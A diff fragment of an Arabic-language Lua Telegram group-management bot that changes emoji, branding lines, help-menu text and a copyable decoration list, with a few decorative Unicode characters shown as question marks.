 if da and da.status_.ID == "ChatMemberStatusCreator" then
-send(msg.chat_id_, msg.id_,' 🥷 انت منشئ الجروب') 
+send(msg.chat_id_, msg.id_,' 🧚‍♀️ انت منشئ الجروب') 
 return false
 end
 local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
 if Added_Me then 
 tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
 local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-Text = ' 🥷 هوا ابن الكلب دا الي ضافك😹» '..Name
+Text = ' 🧚‍♀️ هوا ابن الكلب دا الي ضافك😹» '..Name
 sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
 end,nil)
 else
@@ -11596,7 +11858,9 @@ t = "\n🧚‍♀️قائمه الزخرفه \n≪━━━━━━𝒃𝒂�
 i = 0
 for k,v in pairs(zx.ok) do
 i = i + 1
-t = t..i.."-  "..v.." \n"
+t = t..i.."-  `"..v.."` \n"
+end
+send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━𝒃𝒂𝒌𝒂𝒓━━━━━━≫\n 🧚‍♀️[𝒃𝒂𝒌𝒂𝒓 ](t.me/BK_b_1)🧚‍♀️ ')
 end
 if text == "تعطيل الابراج" and Manager(msg) then
 send(msg.chat_id_, msg.id_, '🧚‍♀️ تم تعطيل الابراج')
@@ -11927,7 +12191,7 @@ W𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒃𝒂𝒌𝒂𝒓
 🧚‍♀️ وصف
 🧚‍♀️ تكرار + عدد
 ☠⟼⟼⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻⟻⟻☠
-[ 𝒃𝒂𝒌𝒂𝒓](t.me/BK_b_1)
+[ 𝑬𝑳𝑴𝑼????𝑰𝑴](t.me/BK_b_1)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12008,7 +12272,7 @@ keyboard.inline_keyboard = {
 {text = 'مبرمج السورس', url="t.me/UU_bh"},
 },
 {
-{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒃𝒂??𝒂𝒓', url="t.me/BK_b_1"},
+{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒃𝒂𝒌𝒂𝒓', url="t.me/BK_b_1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12203,7 +12467,7 @@ W𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒃𝒂𝒌𝒂𝒓
 ☠⟼⟼⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻⟻⟻☠
 🧚‍♀️رفع + تنزيل ← مزه
 🧚‍♀️تاك للمزز
-ٴ┉ ┉ ┉ ┉ ┉ 𝙨𝙤??𝙣 ┉ ┉ ┉ ┉  ┉ٴ
+☠⟼⟼⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻⟻⟻☠
 🧚‍♀️رفع + تنزيل ← وتكه
 🧚‍♀️تاك للوتكات
 ☠⟼⟼⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻⟻⟻☠
@@ -12409,7 +12673,7 @@ local Teext =[[
 🧚‍♀️شنو رئيك بهذا بالرد
 🧚‍♀️شنو رئيك بهاي بالرد
 🧚‍♀️تحب هذا
-☠⟼⟼⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻⟻⟻☠
+☠⟼⟼⟼⟼⟼𝑬𝑳??𝑼𝑺𝑳𝑰𝑴⟻⟻⟻⟻⟻☠
 [ 𝒃𝒂𝒌𝒂𝒓 ](t.me/BK_b_1)
 ]]
 keyboard = {} 
@@ -12458,7 +12722,7 @@ W𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒃𝒂𝒌𝒂𝒓
 ⓽◂ اوامر مطور الاساسي
 ⑩◂ اوامر الاعضاء
 ☠⟼⟼⟼𝒃𝒂𝒌𝒂𝒓⟻⟻⟻☠
-[𝒃𝒂𝒌𝒂𝒓✹ ](t.me/BK_b_1)
+[𝒃𝒂𝒌𝒂𝒓 ](t.me/BK_b_1)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
